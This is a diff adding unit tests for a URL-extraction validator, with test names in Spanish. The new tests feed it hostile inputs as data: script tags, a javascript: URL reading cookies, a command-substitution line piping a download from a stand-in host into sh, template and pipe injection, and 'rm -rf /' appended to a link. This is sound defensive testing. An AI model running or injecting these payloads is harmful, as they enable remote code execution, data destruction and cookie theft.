@@ -36,4 +36,20 @@ describe('extractAnalysisUrl', () => {
     expect(MAX_ANALYSIS_INPUT_LENGTH).toBe(480);
     expect(extractAnalysisUrl(`${'x'.repeat(481)} https://example.test`)).toEqual({ ok: false, reason: 'too_long' });
   });
+
+  it('no acepta scripts ni comandos: solo manda el enlace y rechaza enlaces con caracteres de inyección', () => {
+    expect(extractAnalysisUrl('<script>alert(1)</script>')).toEqual({ ok: false, reason: 'missing_url' });
+    expect(extractAnalysisUrl('javascript:alert(document.cookie)')).toEqual({ ok: false, reason: 'missing_url' });
+    expect(extractAnalysisUrl('$(curl evil.test | sh)')).toEqual({ ok: false, reason: 'missing_url' });
+    expect(extractAnalysisUrl('https://example.test/${7*7}')).toEqual({ ok: false, reason: 'invalid_url' });
+    expect(extractAnalysisUrl('https://example.test/a|sh')).toEqual({ ok: false, reason: 'invalid_url' });
+    expect(extractAnalysisUrl('https://example.test/a\\b')).toEqual({ ok: false, reason: 'invalid_url' });
+    expect(extractAnalysisUrl('https://exa_mple.test/')).toEqual({ ok: false, reason: 'invalid_url' });
+    expect(extractAnalysisUrl('https://example.test/\u200bcuenta')).toEqual({ ok: false, reason: 'invalid_url' });
+  });
+
+  it('de un mensaje con un comando pegado solo toma el enlace, nunca el resto del texto', () => {
+    expect(extractAnalysisUrl('https://example.test/login; rm -rf /')).toEqual({ ok: true, url: 'https://example.test/login' });
+    expect(extractAnalysisUrl('https://example.test/"><script>alert(1)</script>')).toEqual({ ok: true, url: 'https://example.test/' });
+  });
 });
